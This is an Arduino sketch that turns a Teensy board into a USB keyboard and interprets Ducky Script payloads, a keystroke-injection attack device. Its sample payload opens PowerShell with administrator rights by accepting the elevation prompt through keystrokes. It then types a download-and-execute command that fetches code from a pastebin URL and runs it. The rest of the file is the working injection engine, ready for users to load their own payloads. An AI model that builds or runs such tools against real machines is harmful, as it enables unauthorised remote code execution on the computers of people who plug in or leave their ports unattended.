/*
Description:
  - This script turns the Teensy into a keyboard (HID) that uses Ducky Script to execute commands
Requirements:
  - Set USB Type to Keyboard on Arduino IDE
Instructions:
  1) Edit payload_lines[] with payload commands
  2) If using powershell,
    - Set DEFAULT_DELAY to 0
    - This will use scroll lock to wait until powershell script is done executing before continuing the rest of the commands in payload
References:
  - https://www.pjrc.com/teensy/td_keyboard.html
  - https://docs.hak5.org/hc/en-us/articles/360010555153-Ducky-Script-the-USB-Rubber-Ducky-language
  - https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Duckyscript
*/

// Wait time between commands
int wait_time = 18;

// List of commands to run
const char* payload_lines[] = {
  "DEFAULT_DELAY 10",
  "REM This is a comment.",
  "GUI r",
  "DELAY 50",
  "STRING powershell",
  "DELAY 50",
  "CTRL SHIFT ENTER",
  "DELAY 50",
  "ALT y",
  "DELAY 200",
  "DEFAULT_DELAY 0",
  "STRING echo 'You have failed Big Brother...';",
  "STRING iex((iwr http://pastebin.com/raw.php?i=utjUMixw).content);",
  "DEFAULT_DELAY 10",
  "STRING echo 'jk, that was a test of the delay';",
  "ENTER"
};

// Possible commands
const char* commands[] = {
  "REM",
  "DEFAULT_DELAY",
  "DEFAULTDELAY",
  "DELAY",
  "STRING",
  "MENU",
  "APP"
};

// Key pairs of Teensy keycodes and Ducky Script keys
struct key_pair
{
  const char* key;
  int value;
};

const key_pair modifier_keys[] = {
  {"WINDOWS", MODIFIERKEY_GUI},
  {"GUI", MODIFIERKEY_GUI},
  {"SHIFT", MODIFIERKEY_SHIFT},
  {"ALT", MODIFIERKEY_ALT},
  {"CONTROL", MODIFIERKEY_CTRL},
  {"CTRL", MODIFIERKEY_CTRL}
};

const key_pair keys[] = {
  {"a", KEY_A},
  {"b", KEY_B},
  {"c", KEY_C},
  {"d", KEY_D},
  {"e", KEY_E},
  {"f", KEY_F},
  {"g", KEY_G},
  {"h", KEY_H},
  {"i", KEY_I},
  {"j", KEY_J},
  {"k", KEY_K},
  {"l", KEY_L},
  {"m", KEY_M},
  {"n", KEY_N},
  {"o", KEY_O},
  {"p", KEY_P},
  {"q", KEY_Q},
  {"r", KEY_R},
  {"s", KEY_S},
  {"t", KEY_T},
  {"u", KEY_U},
  {"v", KEY_V},
  {"w", KEY_W},
  {"x", KEY_X},
  {"y", KEY_Y},
  {"z", KEY_Z},
  {"1", KEY_1},
  {"2", KEY_2},
  {"3", KEY_3},
  {"4", KEY_4},
  {"5", KEY_5},
  {"6", KEY_6},
  {"7", KEY_7},
  {"8", KEY_8},
  {"9", KEY_9},
  {"0", KEY_0},
  {"ENTER", KEY_ENTER},
  {"ESC", KEY_ESC},
  {"BACKSPACE", KEY_BACKSPACE},
  {"TAB", KEY_TAB},
  {"SPACE", KEY_SPACE},
  {"-", KEY_MINUS},
  {"=", KEY_EQUAL},
  {"[", KEY_LEFT_BRACE},
  {"]", KEY_RIGHT_BRACE},
  {"\\", KEY_BACKSLASH},
  {";", KEY_SEMICOLON},
  {"'", KEY_QUOTE},
  {"`", KEY_TILDE},
  {",", KEY_COMMA},
  {".", KEY_PERIOD},
  {"/", KEY_SLASH},
  {"CAPSLOCK", KEY_CAPS_LOCK},
  {"F1", KEY_F1},
  {"F2", KEY_F2},
  {"F3", KEY_F3},
  {"F4", KEY_F4},
  {"F5", KEY_F5},
  {"F6", KEY_F6},
  {"F7", KEY_F7},
  {"F8", KEY_F8},
  {"F9", KEY_F9},
  {"F10", KEY_F10},
  {"F11", KEY_F11},
  {"F12", KEY_F12},
  {"PRINTSCREEN", KEY_PRINTSCREEN},
  {"SCROLLLOCK", KEY_SCROLL_LOCK},
  {"PAUSE", KEY_PAUSE},
  {"BREAK", KEY_PAUSE},
  {"INSERT", KEY_INSERT},
  {"HOME", KEY_HOME},
  {"PAGEUP", KEY_PAGE_UP},
  {"DELETE", KEY_DELETE},
  {"END", KEY_END},
  {"PAGEDOWN", KEY_PAGE_DOWN},
  {"RIGHT", KEY_RIGHT},
  {"RIGHTARROW", KEY_RIGHT},
  {"LEFT", KEY_LEFT},
  {"LEFTARROW", KEY_LEFT},
  {"DOWN", KEY_DOWN},
  {"DOWNARROW", KEY_DOWN},
  {"UP", KEY_UP},
  {"UPARROW", KEY_UP},
  {"NUMLOCK", KEY_NUM_LOCK},
  {"KP_SLASH", KEYPAD_SLASH},
  {"KP_ASTERISK", KEYPAD_ASTERIX},
  {"KP_MINUS", KEYPAD_MINUS},
  {"KP_PLUS", KEYPAD_PLUS},
  {"KP_ENTER", KEYPAD_ENTER},
  {"KP_1", KEYPAD_1},
  {"KP_2", KEYPAD_2},
  {"KP_3", KEYPAD_3},
  {"KP_4", KEYPAD_4},
  {"KP_5", KEYPAD_5},
  {"KP_6", KEYPAD_6},
  {"KP_7", KEYPAD_7},
  {"KP_8", KEYPAD_8},
  {"KP_9", KEYPAD_9},
  {"KP_0", KEYPAD_0},
  {"KP_DOT", KEYPAD_PERIOD},
  {"KP_EQUAL", KEY_EQUAL}, // No keypad equivalent key for Teensy
  //{"MENU", }, // No equivalent key for Teensy
  {"SLEEP", KEY_SYSTEM_SLEEP}, // Ducky script doesn't use, so added key
  {"WAKE", KEY_SYSTEM_WAKE_UP}, // Ducky script doesn't use, so added key
  {"POWER", KEY_SYSTEM_POWER_DOWN},
  // Media keys
  {"MK_NEXT", KEY_MEDIA_NEXT_TRACK},
  {"MK_PREV", KEY_MEDIA_PREV_TRACK},
  {"MK_STOP", KEY_MEDIA_STOP},
  {"MK_PP", KEY_MEDIA_PLAY_PAUSE},
  {"MK_MUTE", KEY_MEDIA_MUTE},
  {"MK_VOLUP", KEY_MEDIA_VOLUME_INC},
  {"MK_VOLDOWN", KEY_MEDIA_VOLUME_DEC},
  {"MK_PLAY", KEY_MEDIA_PLAY}, // Ducky script doesn't use, so added key
  {"MK_PAUSE", KEY_MEDIA_PAUSE}, // Ducky script doesn't use, so added key
  {"MK_RECORD", KEY_MEDIA_RECORD}, // Ducky script doesn't use, so added key
  {"MK_REWIND", KEY_MEDIA_REWIND}, // Ducky script doesn't use, so added key
  {"MK_FORWARD", KEY_MEDIA_FAST_FORWARD}, // Ducky script doesn't use, so added key
  {"MK_SKIP", KEY_MEDIA_PLAY_SKIP}, // Ducky script doesn't use, so added key
  {"MK_EJECT", KEY_MEDIA_EJECT} // Ducky script doesn't use, so added key
};

// Function prototypes
void wait_response(unsigned int milliseconds);
int startup_delay();
int clear_locks();
void reset_locks(int initial_locks);
void send_keys(int modifier, int key1, int key2 = 0, int key3 = 0, int key4 = 0, int key5 = 0, int key6 = 0);
void clear_keys();

// Function runs at startup
void setup()
{
  // Initialization
  pinMode(LED_BUILTIN, OUTPUT);
  int initial_locks = startup_delay();

  // Execute payload
  digitalWrite(LED_BUILTIN, HIGH);
  for(int i = 0; i < (int)(sizeof(payload_lines)/sizeof(payload_lines[0])); i++)
  {
    // Split command at first space
    int space_index = 0;
    while(payload_lines[i][space_index] != ' ')
    {
      space_index++;
    }
    int commands_index = -1;
    for(int j = 0; j < (int)(sizeof(commands)/sizeof(commands[0])); j++)
    {
      char *ret = strstr(payload_lines[i], commands[j]);
      int loc = ret ? ret - payload_lines[i] : -1;
      if(loc != -1)
      {
        commands_index = j;
        break;
      }
    }

    // "REM"
    if(commands_index == 0)
    {
      continue;
    }
    // "DEFAULT_DELAY" or "DEFAULTDELAY"
    else if(commands_index == 1 || commands_index == 2)
    {
      wait_time = atoi(&payload_lines[i][space_index + 1]) * 10;
      if(wait_time == 0)
      {
        Keyboard.print("$wsh = New-Object -ComObject WScript.Shell;$wsh.SendKeys('{SCROLLLOCK}');");
        send_keys(0, KEY_ENTER);
      }
    }
    // DELAY
    else if(commands_index == 3)
    {
      delay(atoi(&payload_lines[i][space_index + 1]) * 10);
    }
    // "STRING"
    else if(commands_index == 4)
    {
      Keyboard.print(&payload_lines[i][space_index + 1]);
      if(wait_time == 0)
      {
        Keyboard.print(";$wsh.SendKeys('{SCROLLLOCK}');");
        send_keys(0, KEY_ENTER);
      }
    }
    // "MENU"
    else if(commands_index == 5 || commands_index == 6)
    {
      send_keys(MODIFIERKEY_SHIFT, KEY_F10);
    }
    else
    {
      // Read modifier keys in command
      int modifier_or = 0;
      for(int j = 0; j < (int)(sizeof(modifier_keys)/sizeof(modifier_keys[0])); j++)
      {
        char *ret = strstr(payload_lines[i], modifier_keys[j].key);
        int loc = ret ? ret - payload_lines[i] : -1;
        if(loc != -1)
        {
          if(modifier_or == 0)
          {
            modifier_or = modifier_keys[j].value;
          }
          else
          {
            modifier_or |= modifier_keys[j].value;
          }
        }
      }
      // Read non-modifier keys in command
      int extra_keys[] = {0, 0, 0, 0, 0, 0};
      for(int j = 0; j < (int)(sizeof(keys)/sizeof(keys[0])); j++)
      {
        char *ret = strstr(payload_lines[i], keys[j].key);
        int loc = ret ? ret - payload_lines[i] : -1;
        if(loc != -1)
        {
          if(extra_keys[0] == 0)
          {
            extra_keys[0] = keys[j].value;
          }
          else if(extra_keys[1] == 0)
          {
            extra_keys[1] = keys[j].value;
          }
          else if(extra_keys[2] == 0)
          {
            extra_keys[2] = keys[j].value;
          }
          else if(extra_keys[3] == 0)
          {
            extra_keys[3] = keys[j].value;
          }
          else if(extra_keys[4] == 0)
          {
            extra_keys[4] = keys[j].value;
          }
          else if(extra_keys[5] == 0)
          {
            extra_keys[5] = keys[j].value;
          }
        }
      }
      // Send all keys in command (limit of 6 keys not including modifier keys)
      send_keys(modifier_or, extra_keys[0], extra_keys[1], extra_keys[2], extra_keys[3], extra_keys[4], extra_keys[5]);
    }
    wait_response(wait_time);
  }
  digitalWrite(LED_BUILTIN, LOW);

  // Cleanup
  reset_locks(initial_locks);
}

// Function loops infinitely after setup()
void loop()
{
  digitalWrite(LED_BUILTIN, HIGH);
  delay(250);
  digitalWrite(LED_BUILTIN, LOW);
  delay(250);
}

// Wait for a scroll lock toggle or until max amount of time
void wait_response(unsigned int milliseconds)
{
  if(milliseconds == 0)
  {
    while(keyboard_leds != 4 && keyboard_leds != 5 && keyboard_leds != 6 && keyboard_leds != 7)
    {
      delay(10);
    }
    send_keys(0, KEY_SCROLL_LOCK);
  }
  else
  {
    delay(milliseconds);
  }
}

// Use the scroll lock to detect when device is initialized
int startup_delay()
{
  bool current_state = true;
  if(keyboard_leds == 0 || keyboard_leds == 1 || keyboard_leds == 2 || keyboard_leds == 3)
  {
    current_state = false;
  }
  bool changed_state = current_state;
  while(changed_state == current_state)
  {
    send_keys(0, KEY_SCROLL_LOCK);
    if(keyboard_leds == 0 || keyboard_leds == 1 || keyboard_leds == 2 || keyboard_leds == 3)
    {
      changed_state = false;
    }
    else
    {
      changed_state = true;
    }
  }
  send_keys(0, KEY_SCROLL_LOCK);
  return clear_locks();
}

// Set CAPS/NUM/SCRL lock keys to off
int clear_locks()
{
  int initial_locks = keyboard_leds;
  if(keyboard_leds == 1 || keyboard_leds == 3 || keyboard_leds == 5 || keyboard_leds == 7)
  {
    send_keys(0, KEY_NUM_LOCK);
  }
  if(keyboard_leds == 2 || keyboard_leds == 3 || keyboard_leds == 6 || keyboard_leds == 7)
  {
    send_keys(0, KEY_CAPS_LOCK);
  }
  if(keyboard_leds == 4 || keyboard_leds == 5 || keyboard_leds == 6 || keyboard_leds == 7)
  {
    send_keys(0, KEY_SCROLL_LOCK);
  }
  return initial_locks;
}

// Reset CAPS/NUM/SCRL locks to original values
void reset_locks(int initial_locks)
{
  if(initial_locks == 1 || initial_locks == 3 || initial_locks == 5 || initial_locks == 7)
  {
    if(keyboard_leds != 1 && keyboard_leds != 3 && keyboard_leds != 5 && keyboard_leds != 7)
    {
      send_keys(0, KEY_NUM_LOCK);
    }
  }
  if(initial_locks == 2 || initial_locks == 3 || initial_locks == 6 || initial_locks == 7)
  {
    if(keyboard_leds != 2 && keyboard_leds != 3 && keyboard_leds != 6 && keyboard_leds != 7)
    {
      send_keys(0, KEY_CAPS_LOCK);
    }
  }
  if(initial_locks == 4 || initial_locks == 5 || initial_locks == 6 || initial_locks == 7)
  {
    if(keyboard_leds != 4 && keyboard_leds != 5 && keyboard_leds != 6 && keyboard_leds != 7)
    {
      send_keys(0, KEY_SCROLL_LOCK);
    }
  }
}

// Press given keys
void send_keys(int modifier, int key1, int key2, int key3, int key4, int key5, int key6)
{
  Keyboard.set_modifier(modifier);
  Keyboard.set_key1(key1);
  Keyboard.set_key2(key2);
  Keyboard.set_key3(key3);
  Keyboard.set_key4(key4);
  Keyboard.set_key5(key5);
  Keyboard.set_key6(key6);
  Keyboard.send_now();
  delay(10);
  clear_keys();
}

// Reset all key slots
void clear_keys()
{
  Keyboard.set_modifier(0);
  Keyboard.set_key1(0);
  Keyboard.set_key2(0);
  Keyboard.set_key3(0);
  Keyboard.set_key4(0);
  Keyboard.set_key5(0);
  Keyboard.set_key6(0);
  Keyboard.send_now();
}
